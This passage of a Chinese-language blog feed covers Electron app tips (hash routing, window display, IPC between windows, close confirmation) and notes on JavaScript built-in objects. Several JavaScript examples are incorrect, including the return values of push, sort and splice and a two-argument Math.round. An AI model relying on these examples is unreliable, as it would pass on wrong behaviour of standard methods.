class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Page navigate</span></span><br><span class="line">mainWindow.webContents.on(<span class="string">'did-navigate-in-page'</span>, (event, url) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> before = mainWindow.webContents.getURL();</span><br><span class="line">  <span class="keyword">if</span> (!isDev &amp;&amp; before !== url) &#123;</span><br><span class="line">    <span class="comment">// 要跳转的url和当前url不同时，才跳转</span></span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">const</span> hash = url.split(<span class="string">'#'</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">const</span> startUrl = <span class="built_in">require</span>(<span class="string">'url'</span>).format(&#123;</span><br><span class="line">      pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">      protocol: <span class="string">'file:'</span>,</span><br><span class="line">      slashes: <span class="literal">false</span>,</span><br><span class="line">      hash</span><br><span class="line">    &#125;);</span><br><span class="line">    mainWindow.loadURL(startUrl);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在代码中统一使用修改 hash 值，进行路由跳转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.hash = <span class="string">'liveroom'</span>;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-首次进入页面白屏"><a href="#5-首次进入页面白屏" class="headerlink" title="5. 首次进入页面白屏"></a>5. 首次进入页面白屏</h3><p>在加载页面时，渲染进程第一次完成绘制时，会发出 ready-to-show 事件 。 在此事件后显示窗口将没有视觉闪烁：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; BrowserWindow &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>);</span><br><span class="line"><span class="keyword">let</span> win = <span class="keyword">new</span> BrowserWindow(&#123; <span class="attr">show</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">win.once(<span class="string">'ready-to-show'</span>, () =&gt; &#123;</span><br><span class="line">  win.show();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这个事件通常在 did-finish-load 事件之后发出，但是页面有许多远程资源时，它可能会在 did-finish-load 之前发出事件。</p><p><br></p><h3 id="6-frameless窗口设置拖动区域"><a href="#6-frameless窗口设置拖动区域" class="headerlink" title="6. frameless窗口设置拖动区域"></a>6. frameless窗口设置拖动区域</h3><p>注意，mac 关闭了 devTool 拖动才能生效</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div</span> &#123;</span><br><span class="line">  <span class="attribute">-webkit-user-select</span>: none;</span><br><span class="line">  <span class="attribute">-webkit-app-region</span>: drag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-打开新窗口"><a href="#7-打开新窗口" class="headerlink" title="7. 打开新窗口"></a>7. 打开新窗口</h3><p>需要全局定义一个<code>win</code>变量来存储所有新窗口，不然关闭窗口会报错。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> win = &#123;&#125;;</span><br><span class="line">ipcMain.on(<span class="string">'newwin'</span>, (event, value) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; width, height, minWidth, minHeight, hash &#125; = value;</span><br><span class="line">  win[hash] = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    width,</span><br><span class="line">    height,</span><br><span class="line">    minHeight,</span><br><span class="line">    minWidth,</span><br><span class="line">    fullscreenable: <span class="literal">false</span>,</span><br><span class="line">    titleBarStyle: <span class="string">'hidden'</span>,</span><br><span class="line">    parent: mainWindow,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">      nodeIntegration: <span class="literal">true</span> <span class="comment">//设置此处</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> startUrl;</span><br><span class="line">  <span class="keyword">if</span> (isDev) &#123;</span><br><span class="line">    startUrl = <span class="string">`http://localhost:8000#<span class="subst">$&#123;hash&#125;</span>`</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    startUrl = url.format(&#123;</span><br><span class="line">      pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">      protocol: <span class="string">'file:'</span>,</span><br><span class="line">      slashes: <span class="literal">false</span>,</span><br><span class="line">      hash</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  win[hash].loadURL(startUrl);</span><br><span class="line">  win[hash].on(<span class="string">'closed'</span>, () =&gt; &#123;</span><br><span class="line">    win[hash] = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>渲染进程中打开新窗口<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ipcRenderer.send(<span class="string">'newwin'</span>, &#123;</span><br><span class="line">  width,</span><br><span class="line">  height,</span><br><span class="line">  minWidth,</span><br><span class="line">  minHeight,</span><br><span class="line">  hash,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="8-多个窗口之间通信"><a href="#8-多个窗口之间通信" class="headerlink" title="8. 多个窗口之间通信"></a>8. 多个窗口之间通信</h3><p>这里记录一个需求：打开了一个新窗口，在新窗口点击一个按钮时，会自动关闭该窗口，并在主窗口显示一个小弹窗。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// electron入口文件</span></span><br><span class="line">ipcMain.on(<span class="string">'close-newwin'</span>, (event, value) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; type &#125; = <span class="built_in">JSON</span>.parse(value);</span><br><span class="line">  <span class="comment">// 监听窗口向主进程发送消息，收到消息后，向父窗口的渲染进程发消息</span></span><br><span class="line">  mainWindow.webContents.send(<span class="string">'newmsg'</span>, value);</span><br><span class="line">  win[type].close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="9-关闭窗口二次确认框"><a href="#9-关闭窗口二次确认框" class="headerlink" title="9. 关闭窗口二次确认框"></a>9. 关闭窗口二次确认框</h3><p>关闭窗口时，弹出自定义弹框。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// electron入口文件</span></span><br><span class="line"><span class="comment">// 阻止默认close事件，先渲染进程发送弹出确认框的消息</span></span><br><span class="line">mainWindow.on(<span class="string">'close'</span>, e =&gt; &#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">  <span class="keyword">const</span> url = mainWindow.webContents.getURL();</span><br><span class="line">  mainWindow.webContents.send(<span class="string">'confirm-close-app'</span>, url);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收渲染进程的close-app消息，收到则关闭app</span></span><br><span class="line">ipcMain.on(<span class="string">'close-app'</span>, (event, value) =&gt; &#123;</span><br><span class="line">  mainWindow = <span class="literal">null</span>;</span><br><span class="line">  app.exit();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>渲染进程中，监听confirm-close-app<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">componentDidMount() &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; ipcRenderer &#125; = <span class="built_in">window</span>.electron;</span><br><span class="line">    ipcRenderer.on(<span class="string">'confirm-close-app'</span>, (event, arg) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        <span class="comment">// 显示弹窗</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 关闭窗口</span></span><br><span class="line">        ipcRenderer.send(<span class="string">'close-app'</span>, <span class="string">'close'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://stackoverflow.com/questions/54011027/routing-doesnt-work-on-packaged-electron-app-using-reactjs-and-reach-router" target="_blank" rel="noopener">Routing doesn’t work on packaged Electron app using ReactJS and reach-router</a></li><li><a href="https://stackoverflow.com/questions/44818508/how-do-i-move-a-frameless-window-in-electron-without-using-webkit-app-region" target="_blank" rel="noopener">How do I move a frameless window in Electron without using -webkit-app-region</a></li><li><a href="https://stackoverflow.com/questions/33505485/frameless-window-not-draggable-mac-osx" target="_blank" rel="noopener">Frameless window not draggable - Mac OSX</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>哈希表、映射、集合</title>
      <link href="/2019/09/19/LeetCode-%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
      <url>/2019/09/19/LeetCode-%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a>1. 数据结构</h3><p>哈希表，是根据关键码值(key value)而直接进行访问的数据结构。它通过把关键码值映射到表中一个位置来访问记录，以加速查找的速度。</p><ul><li>map 映射</li><li>set 集合</li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS标准内置对象的属性和方法</title>
      <link href="/2019/09/15/JS%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95/"/>
      <url>/2019/09/15/JS%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-初级"><a href="#1-初级" class="headerlink" title="1. 初级"></a>1. 初级</h3><h4 id="1-1-语法和数据类型"><a href="#1-1-语法和数据类型" class="headerlink" title="1.1 语法和数据类型"></a>1.1 语法和数据类型</h4><ul><li><p>声明变量<br><code>var/let/const</code>， 如果没有赋初始值，则其值为<code>undefined</code>，试图访问一个未声明的变量会导致一个<code>ReferenceError</code>异常抛出。你可以使用<code>undefined</code>来判断变量是否已赋值。<code>undefined</code>值在布尔类型环境中会被当做<code>false</code>,在数值类型环境中，会被转换为<code>NaN</code>。</p></li><li><p>变量的作用域<br>全局变量-在所有函数之外生命的变量；局部变量-在函数内部生命的变量。ES6之前的js没有语句块作用域。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(true)&#123;</span><br><span class="line">  var x = 5;</span><br><span class="line">  let y = 5;</span><br><span class="line">&#125;</span><br><span class="line">console.log(x);   // 5</span><br><span class="line">console.log(y);   // ReferenceError: y is not defined</span><br></pre></td></tr></table></figure></li><li><p>变量声明提升<br>变量会被提升或移到了函数或语句的顶部。然后提升后的变量将返回<code>undefined</code>值。在使用或引用某个变量之后进行声明和初始化操作。<code>let</code>将不会提升变量到代码块的顶部。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(x === undefined)  // true</span><br><span class="line">var x = &apos;global value&apos;;</span><br><span class="line"></span><br><span class="line">(function()&#123;</span><br><span class="line">  console.log(x); // undefined</span><br><span class="line">  var x = &apos;local value&apos;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li><li><p>函数提升<br>只有函数声明会被提升到顶部，而不包含函数的表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 函数声明</span><br><span class="line">foo();   // &apos;bar&apos;</span><br><span class="line">function foo() &#123;</span><br><span class="line">  console.log(&apos;bar&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 函数表达式</span><br><span class="line">baz();  // TypeError: baz is not a function</span><br><span class="line">var baz = function() &#123;</span><br><span class="line">  console.log(&apos;baz&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>数据类型</em>: Boolean, null, undefined, Number, String, Symbol, Object</p></li><li><p><em>false等效值</em>: false, undefined, null, 0, NaN, ‘’(空字符串)<br><br></p></li></ul><h4 id="1-2-循环和迭代"><a href="#1-2-循环和迭代" class="headerlink" title="1.2 循环和迭代"></a>1.2 循环和迭代</h4><ul><li><p>break<br>使用<code>break</code>来终止循环，它会立即终止当前所在的while, do-while, for, 或者switch并把控制权交回这些结构后面的语句</p></li><li><p>continue<br><code>continue</code>语句可以用来继续执行（跳过代码块的剩余部分并进入下一个循环）一个while, do-while, for语句<br><br></p></li></ul><h4 id="1-3-函数"><a href="#1-3-函数" class="headerlink" title="1.3 函数"></a>1.3 函数</h4><p>在函数内定义的变量不能在函数之外的任何地方访问，相应的，一个函数可以访问定义在其范围内的任何变量和函数。</p><ul><li><p>箭头函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a2 = a.map(function(s)&#123; return s.length &#125;);</span><br><span class="line">var a3 = a.map(s =&gt; s.length)</span><br></pre></td></tr></table></figure></li><li><p>预定义函数</p></li></ul><table><thead><tr><th>函数</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>eval()</td><td style="text-align:center">对一串字符串形式的js代码字符求值</td></tr><tr><td>uneval()</td><td style="text-align:center">表示给定对象的源代码的字符串</td></tr><tr><td>isFinite()</td><td style="text-align:center">判断是否是有限的数值</td></tr><tr><td>isNaN()</td><td style="text-align:center">判断一个值是否是NaN</td></tr><tr><td>parseFloat()</td><td style="text-align:center">返回一个浮点数</td></tr><tr><td>parseInt()</td><td style="text-align:center">返回一个整数</td></tr><tr><td>encodeURI()、encodeURIComponent()</td><td style="text-align:center">把字符串作为URI进行编码</td></tr><tr><td>decodeURI()、decoreURIComponent()</td><td style="text-align:center">对encodeURI()编码过的URI进行解码</td></tr></tbody></table><p><br></p><h4 id="1-4-表达式和运算符"><a href="#1-4-表达式和运算符" class="headerlink" title="1.4 表达式和运算符"></a>1.4 表达式和运算符</h4><table><thead><tr><th></th><th style="text-align:center">一元操作符/关系操作符</th></tr></thead><tbody><tr><td>delete</td><td style="text-align:center"><code>delete objectName</code> / <code>delete objectName.property</code> / <code>delete arrayName[index]</code>，delete操作成功，元素会变成<code>undefined</code>。Delete成功返回<code>true</code>,不成功返回<code>false</code></td></tr><tr><td>typeof</td><td style="text-align:center">返回一个变量的类型的字符串值 <code>return &quot;function/string/number/object/undefined/boolean&quot;</code></td></tr><tr><td>in</td><td style="text-align:center"><code>index in Array</code>, <code>propertName in object</code>，如果所指定的属性存在于对象中，则返回<code>true</code></td></tr><tr><td>instanceof</td><td style="text-align:center">判断对象是不是所指定的类型<code>objectName instanceof objectType</code></td></tr></tbody></table><p><br></p><h4 id="1-5-Number对象"><a href="#1-5-Number对象" class="headerlink" title="1.5 Number对象"></a>1.5 Number对象</h4><ul><li><em>Number的方法</em><br>parseFloat(), parseInt(), isFinite(), isInteger(), isNaN(), isSafeInteger();</li><li><em>Number原型上的一些方法</em><br><strong>toExponential()</strong>: 返回一个数字的指数形式的字符串，形如: 1.23e+2;<br><strong>toFixed()</strong>: 返回指定小数位数的表示形式，<code>var a = 123; a.toFixed(2) // 123.00</code><br><strong>toPrecision()</strong>: 返回一个指定精度的数字， <code>var a = 123; a.toPrecision(2) // 1.2e+2</code><br><br></li></ul><h4 id="1-6-Math对象"><a href="#1-6-Math对象" class="headerlink" title="1.6 Math对象"></a>1.6 Math对象</h4><ul><li><em>Math常用方法</em><br><strong>floor()</strong>     :向下取整<br><strong>ceil()</strong>      :向上取整<br><strong>min() max()</strong> :返回一个以逗号间隔的数字参数列表中的最大/最小值<br><strong>random()</strong>    :返回0和1之间的随机数<br><strong>round(3.1415926,2)=3.14</strong></li><li><em>Math计算方法</em><br>PI, abs(), sin(),sqrt(), log10()等<br><br></li></ul><h4 id="1-7-Date对象"><a href="#1-7-Date对象" class="headerlink" title="1.7 Date对象"></a>1.7 Date对象</h4><p>Date是以1970年1月1日00:00:00以来的毫秒数来存储。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>();  <span class="comment">// Thu Oct 17 2019 09:07:25 GMT+0800 (中国标准时间)</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'December 25, 1995 13:00:00'</span>);</span><br><span class="line">today.getDate()       <span class="comment">// 一个月中的某一天(1-31)</span></span><br><span class="line">today.getDay()        <span class="comment">// 一周中的某一天(0-6)</span></span><br><span class="line">today.getMonth()      <span class="comment">// 月(0-11)</span></span><br><span class="line">today.getFullYear()   <span class="comment">// 年(四位数字)</span></span><br><span class="line">today.getHours()      <span class="comment">// 小时(0-23)</span></span><br><span class="line">today.getMinutes()    <span class="comment">// 分钟(0-59)</span></span><br><span class="line">today.getSeconds()    <span class="comment">// 秒数(0-59)</span></span><br><span class="line">today.getMilliseconds() <span class="comment">// 毫秒(0-999)</span></span><br><span class="line">today.getTime()       <span class="comment">// 返回1970年1月1日至今的毫秒数</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-8-String"><a href="#1-8-String" class="headerlink" title="1.8 String"></a>1.8 String</h4><p>String用于表示文本型的数据，它是由无符号整数值(16bit)作为元素而组成的集合。Unicode转义序列在\u之后需要至少4个字符。</p><table><thead><tr><th></th><th style="text-align:center">String对象方法</th></tr></thead><tbody><tr><td>charAt, charCodeAt, codePointAt</td><td style="text-align:center">返回字符串指定位置的字符或者字符编码 <code>&#39;hello&#39;.charAt(0) // &#39;h&#39;</code></td></tr><tr><td>indexOf, lastIndexOf</td><td style="text-align:center">返回字符串中指定子串的位置或最后位置</td></tr><tr><td>startsWith, endsWith, includes</td><td style="text-align:center">返回字符串是否以指定字符串开始、结束、或包含指定字符串</td></tr><tr><td>concat</td><td style="text-align:center">连接两个字符串并返回新的字符串</td></tr><tr><td>fromCharCode, fromCodePoint</td><td style="text-align:center">从指定的Unicode值序列构造一个字符串。</td></tr><tr><td>split</td><td style="text-align:center">将字符串分离成一个个子串，并放入数组中</td></tr><tr><td>slice</td><td style="text-align:center">从一个字符串中提取片段并作为新字符串返回</td></tr><tr><td>substring,substr</td><td style="text-align:center">分别通过指定起始和结束位置，起始位置和长度来返回字符串的指定子集</td></tr><tr><td>match, replace, search</td><td style="text-align:center">通过正则表达式来工作</td></tr><tr><td>toLowerCase, toUpperCase</td><td style="text-align:center">返回字符串的小写、大写表示</td></tr><tr><td>normalize</td><td style="text-align:center">按照指定的Unicode形式将字符串正规化</td></tr><tr><td>repeat</td><td style="text-align:center">将字符串内容重复指定次数后返回</td></tr><tr><td>trim</td><td style="text-align:center">去掉字符串开头和结尾的空白字符</td></tr></tbody></table><ul><li>模板字符串<br>使用反勾号(``)包裹内容，它可以实现多行字符串或字符串内插等特性。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 多行</span><br><span class="line">&quot;line 1 \n\</span><br><span class="line"> line 2&quot;</span><br><span class="line">`line 1</span><br><span class="line"> line 2`</span><br><span class="line"></span><br><span class="line"> // 嵌入表达式</span><br><span class="line"> &quot;fifteen is&quot; + (a + b) + &quot;years old&quot;</span><br><span class="line"> `fifteen $&#123; a + b &#125; years old`</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-9-正则表达式"><a href="#1-9-正则表达式" class="headerlink" title="1.9 正则表达式"></a>1.9 正则表达式</h4><p><code>let regex = new RegExp(/^[a-zA-Z]+[0-9]*W?_$/, &quot;gi&quot;)</code></p><table><thead><tr><th></th><th style="text-align:center">正则表达式方法</th></tr></thead><tbody><tr><td>exec</td><td style="text-align:center">在字符串中查看匹配的RegExp方法，返回一个数组或null</td></tr><tr><td>test</td><td style="text-align:center">在字符串中测试是否匹配的RegExp方法，返回true或fasle</td></tr><tr><td>match</td><td style="text-align:center">在字符串中查找匹配的string方法，返回一个数组或null</td></tr><tr><td>search</td><td style="text-align:center">在字符串中测试匹配的string方法，返回匹配到的位置索引，或-1</td></tr><tr><td>replace</td><td style="text-align:center">在字符串中查找匹配的string方法，并且替换字符串</td></tr><tr><td>split</td><td style="text-align:center">使用正则分隔一个字符串，存储到数组中</td></tr></tbody></table><p><br></p><h4 id="1-10-Array对象"><a href="#1-10-Array对象" class="headerlink" title="1.10 Array对象"></a>1.10 Array对象</h4><p>数组是一个有序的数据集合，我们可以通过数组名称和索引进行访问。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ele1, elem2, ..., elemN]</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(elem1, elem2, ..., elemN)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(arrayLength)</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>方法</th><th style="text-align:center">描述</th><th style="text-align:right">返回值</th><th>原数组变成了</th></tr></thead><tbody><tr><td>concat</td><td style="text-align:center">连接两个数组并返回一个新的数组</td></tr></tbody></table><table><thead><tr><th></th><th style="text-align:center">数组的方法</th></tr></thead><tbody><tr><td>concat</td><td style="text-align:center">连接两个数组并返回一个新的数组 <code>[1,2,3]concat(&#39;a&#39;,&#39;b&#39;); // [1,2,3,&#39;a&#39;,&#39;b&#39;]</code></td></tr><tr><td>join</td><td style="text-align:center">将数组的所有元素连接成一个字符串 <code>[1,2,3].join(&#39;-&#39;) // 1-2-3</code></td></tr><tr><td>push</td><td style="text-align:center">在数组末尾添加一个或多个元素，并返回数组操作后的长度 <code>[1,2,3].push(1) // [1,2,3,1]</code></td></tr><tr><td>pop</td><td style="text-align:center">从数组移出最后一个元素，并返回该元素。</td></tr><tr><td>shift</td><td style="text-align:center">从数组移除第一个元素</td></tr><tr><td>unshift</td><td style="text-align:center">从数组开头添加元素 <code>[1,2,3].unshift(4,5) // [4,5,1,2,3]</code></td></tr><tr><td>slice</td><td style="text-align:center">从数组提取一个片段，并作为一个新数组 <code>[1,2,3,4].slice(0,2) // [1,2]</code></td></tr><tr><td>splice</td><td style="text-align:center">从数组移出一些元素，并替换它们 <code>slice(index, count_to_move, addElement1, addElement2);[1,2,3,4,5].splice(1,3,&#39;a&#39;,&#39;b&#39;) // [1,&#39;a&#39;,&#39;b&#39;,5]</code></td></tr><tr><td>reverse</td><td style="text-align:center">颠倒数组元素的顺序 <code>[1,2,3].reverse() // [3,2,1]</code></td></tr><tr><td>sort</td><td style="text-align:center">给数组元素排序 <code>[1,2,3].sort() // [3,2,1]</code></td></tr><tr><td>indexOf</td><td style="text-align:center">在数组中搜索searchElement 并返回第一个匹配的索引 <code>[1,1,1,2].indexOf(2,1) // 3 indexOf(searchElement, fromIndex)</code></td></tr><tr><td>lastIndexOf</td><td style="text-align:center">和indexOf差不多，从结尾开始，反向搜索 </td></tr><tr><td>forEach</td><td style="text-align:center">在数组每个元素上执行callback <code>[1,2,3].forEach(fucntion(item){ callback(item); })</code></td></tr><tr><td>map</td><td style="text-align:center">在数组每个元素上执行callback，将所有操作结果放入数组中，返回该新数组 <code>[1,2,3].map(function(item){ return callback(item) })</code></td></tr><tr><td>filter</td><td style="text-align:center">返回一个在回调函数上返回true的元素的新数组 <code>[1,&#39;a&#39;].filter(function(item){ return typeof item === &#39;number&#39;}) // [1]</code></td></tr><tr><td>every</td><td style="text-align:center">当数组中每一个元素在callback上被返回true时，就返回true <code>[1, 2].every(function(item){ return typeof item === &#39;number&#39;}) // true</code></td></tr><tr><td>some</td><td style="text-align:center">只要数组中有一项在callback上被返回true，就返回true <code>[1,&#39;a&#39;].some(function(item){ return typeof item === &#39;number&#39;}) // true</code></td></tr><tr><td>reduce</td><td style="text-align:center">使用callback(firstValue, secondValue)把数组列表计算成一个单一值。 <code>[1,2].reduce(function(first,second){ return first + second}, 0) // 3</code></td></tr><tr><td>reduceRight</td><td style="text-align:center">和reduce相似，从最后一个元素开始</td></tr><tr><td>toString</td><td style="text-align:center">返回一个包含数组中所有元素的字符串，每个元素通过逗号分隔</td></tr></tbody></table><p><code>Array.slice</code><br>slice 不会修改原数组，只会返回一个浅复制了原数组中的元素的一个新数组。原数组的元素会按照下述规则拷贝：</p><p>如果该元素是个对象引用 （不是实际的对象），slice 会拷贝这个对象引用到新的数组里。两个对象引用都引用了同一个对象。如果被引用的对象发生改变，则新的和原来的数组中的这个元素也会发生改变。<br>对于字符串、数字及布尔值来说（不是 String、Number 或者 Boolean 对象），slice 会拷贝这些值到新的数组里。在别的数组里修改这些字符串或数字或是布尔值，将不会影响另一个数组</p><p><br></p><h4 id="1-11-Map对象"><a href="#1-11-Map对象" class="headerlink" title="1.11 Map对象"></a>1.11 Map对象</h4><p>一个Map对象是一个简单的键值对映射集合，可以按照数据插入时的顺序遍历所有的元素。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var a = new Map();</span><br><span class="line">a.set(&apos;dog&apos;, 123);</span><br><span class="line">a.size // 1</span><br><span class="line">a.get(&apos;fox&apos;) // undefined</span><br><span class="line">a.has(&apos;dog&apos;) // true</span><br><span class="line">a.delete(&apos;dog&apos;)</span><br><span class="line">for (var [key, value] of a)&#123;</span><br><span class="line">  console.log(key + value)</span><br><span class="line">&#125;</span><br><span class="line">a.clear()</span><br></pre></td></tr></table></figure></p><p><em>Object和Map的对比</em><br>Object被用于将字符串类型映射到数值。object允许设置键值对、根据键获取值，删除键，检查某个键是否存在。而Map具有更多优势。</p><ul><li>Object的键均为strings类型，在Map里键可以是任意类型</li><li>Object的尺寸必须手动计算，Map的尺寸则很容易获得</li><li>Map的遍历遵循元素的插入顺序</li><li>Object有原型，所有映射中有一些缺省的值<br><br></li></ul><h4 id="1-12-Set对象"><a href="#1-12-Set对象" class="headerlink" title="1.12 Set对象"></a>1.12 Set对象</h4><p>Set对象是一组值得集合，这些值都是不重复的， 可以按照添加顺序来遍历。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 